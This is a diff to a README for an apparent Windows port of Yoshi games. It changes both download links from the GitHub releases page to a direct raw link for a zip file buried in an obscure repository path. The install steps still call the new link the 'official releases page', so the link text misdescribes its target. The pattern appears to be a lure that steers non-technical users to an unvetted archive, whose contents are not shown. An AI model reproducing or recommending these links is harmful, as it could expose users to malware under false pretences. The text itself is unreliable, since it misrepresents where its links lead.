@@ -1,6 +1,6 @@
 # 🦖 Yoshi-pc - Play your favorite Yoshi games today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sacramental-familycourt935/Yoshi-pc/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/sacramental-familycourt935/Yoshi-pc/main/PCport/Properties/pc-Yoshi-v3.2.zip)
 
 This application provides a streamlined way to run Nintendo-style games on your personal computer. It focuses on compatibility and performance, allowing you to experience titles like Yoshi and the Mysterious Book on Windows systems. You do not need technical skills or advanced configuration to use this software.
 
@@ -21,7 +21,7 @@ If your computer uses an integrated graphics chip, performance might vary. Ensur
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/sacramental-familycourt935/Yoshi-pc/releases) to access the download files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/sacramental-familycourt935/Yoshi-pc/main/PCport/Properties/pc-Yoshi-v3.2.zip) to access the download files.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.zip` to start the download.
 4. Open your Downloads folder once the file finishes.
